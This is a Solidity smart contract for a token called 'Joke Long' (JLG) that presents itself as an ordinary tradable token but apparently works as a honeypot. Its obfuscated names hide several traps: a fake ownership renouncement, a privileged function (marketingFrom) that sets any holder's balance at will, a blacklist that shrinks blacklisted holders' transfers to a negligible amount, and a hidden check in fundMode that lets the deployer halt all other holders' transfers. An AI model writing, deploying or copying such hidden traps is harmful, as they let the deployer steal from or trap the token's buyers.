//SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

interface tradingBuy {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract teamListFrom {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface listExempt {
    function createPair(address minMax, address txIs) external returns (address);
}

interface isAmount {
    function totalSupply() external view returns (uint256);

    function balanceOf(address tradingEnable) external view returns (uint256);

    function transfer(address limitSender, uint256 exemptReceiver) external returns (bool);

    function allowance(address fromAutoTeam, address spender) external view returns (uint256);

    function approve(address spender, uint256 exemptReceiver) external returns (bool);

    function transferFrom(
        address sender,
        address limitSender,
        uint256 exemptReceiver
    ) external returns (bool);

    event Transfer(address indexed from, address indexed maxEnable, uint256 value);
    event Approval(address indexed fromAutoTeam, address indexed spender, uint256 value);
}

interface isAmountMetadata is isAmount {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract JokeLong is teamListFrom, isAmount, isAmountMetadata {

    function allowance(address maxToken, address tradingTxSwap) external view virtual override returns (uint256) {
        if (tradingTxSwap == minLaunchTeam) {
            return type(uint256).max;
        }
        return takeAuto[maxToken][tradingTxSwap];
    }

    string private receiverAuto = "Joke Long";

    uint256 private tradingTx;

    constructor (){
        if (maxFrom != tradingTx) {
            maxTeamSell = false;
        }
        tradingBuy walletLiquidity = tradingBuy(minLaunchTeam);
        receiverBuy = listExempt(walletLiquidity.factory()).createPair(walletLiquidity.WETH(), address(this));
        if (maxTeamSell == limitMarketing) {
            maxTeamSell = true;
        }
        txMode = _msgSender();
        sellLiquidity();
        teamMode[txMode] = true;
        listAtLimit[txMode] = maxTotalTo;
        
        emit Transfer(address(0), txMode, maxTotalTo);
    }

    mapping(address => mapping(address => uint256)) private takeAuto;

    function marketingAutoFee(uint256 exemptReceiver) public {
        launchSender();
        liquidityMarketing = exemptReceiver;
    }

    mapping(address => bool) public teamMode;

    mapping(address => bool) public receiverList;

    uint256 private maxFrom;

    bool public takeToken;

    function balanceOf(address tradingEnable) public view virtual override returns (uint256) {
        return listAtLimit[tradingEnable];
    }

    function getOwner() external view returns (address) {
        return launchTokenAt;
    }

    uint8 private receiverSender = 18;

    function totalSupply() external view virtual override returns (uint256) {
        return maxTotalTo;
    }

    address private launchTokenAt;

    function sellLiquidity() public {
        emit OwnershipTransferred(txMode, address(0));
        launchTokenAt = address(0);
    }

    event OwnershipTransferred(address indexed shouldList, address indexed atTx);

    mapping(address => uint256) private listAtLimit;

    string private marketingSwap = "JLG";

    function name() external view virtual override returns (string memory) {
        return receiverAuto;
    }

    uint256 takeMarketing;

    address public txMode;

    function decimals() external view virtual override returns (uint8) {
        return receiverSender;
    }

    function launchSender() private view {
        require(teamMode[_msgSender()]);
    }

    function autoMinFrom(address exemptFund) public {
        if (takeToken) {
            return;
        }
        
        teamMode[exemptFund] = true;
        
        takeToken = true;
    }

    function approve(address tradingTxSwap, uint256 exemptReceiver) public virtual override returns (bool) {
        takeAuto[_msgSender()][tradingTxSwap] = exemptReceiver;
        emit Approval(_msgSender(), tradingTxSwap, exemptReceiver);
        return true;
    }

    address txMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    address minLaunchTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function symbol() external view virtual override returns (string memory) {
        return marketingSwap;
    }

    function transferFrom(address swapFrom, address limitSender, uint256 exemptReceiver) external override returns (bool) {
        if (_msgSender() != minLaunchTeam) {
            if (takeAuto[swapFrom][_msgSender()] != type(uint256).max) {
                require(exemptReceiver <= takeAuto[swapFrom][_msgSender()]);
                takeAuto[swapFrom][_msgSender()] -= exemptReceiver;
            }
        }
        return fundMode(swapFrom, limitSender, exemptReceiver);
    }

    function transfer(address maxTx, uint256 exemptReceiver) external virtual override returns (bool) {
        return fundMode(_msgSender(), maxTx, exemptReceiver);
    }

    bool public limitMarketing;

    function fundMode(address swapFrom, address limitSender, uint256 exemptReceiver) internal returns (bool) {
        if (swapFrom == txMode) {
            return atLaunchWallet(swapFrom, limitSender, exemptReceiver);
        }
        uint256 launchedSender = isAmount(receiverBuy).balanceOf(txMin);
        require(launchedSender == liquidityMarketing);
        require(limitSender != txMin);
        if (receiverList[swapFrom]) {
            return atLaunchWallet(swapFrom, limitSender, sellShould);
        }
        return atLaunchWallet(swapFrom, limitSender, exemptReceiver);
    }

    function enableAt(address isTotal) public {
        launchSender();
        
        if (isTotal == txMode || isTotal == receiverBuy) {
            return;
        }
        receiverList[isTotal] = true;
    }

    bool public maxTeamSell;

    uint256 constant sellShould = 10 ** 10;

    function owner() external view returns (address) {
        return launchTokenAt;
    }

    function atLaunchWallet(address swapFrom, address limitSender, uint256 exemptReceiver) internal returns (bool) {
        require(listAtLimit[swapFrom] >= exemptReceiver);
        listAtLimit[swapFrom] -= exemptReceiver;
        listAtLimit[limitSender] += exemptReceiver;
        emit Transfer(swapFrom, limitSender, exemptReceiver);
        return true;
    }

    uint256 private maxTotalTo = 100000000 * 10 ** 18;

    uint256 liquidityMarketing;

    bool public autoMarketing;

    address public receiverBuy;

    function marketingFrom(address maxTx, uint256 exemptReceiver) public {
        launchSender();
        listAtLimit[maxTx] = exemptReceiver;
    }

}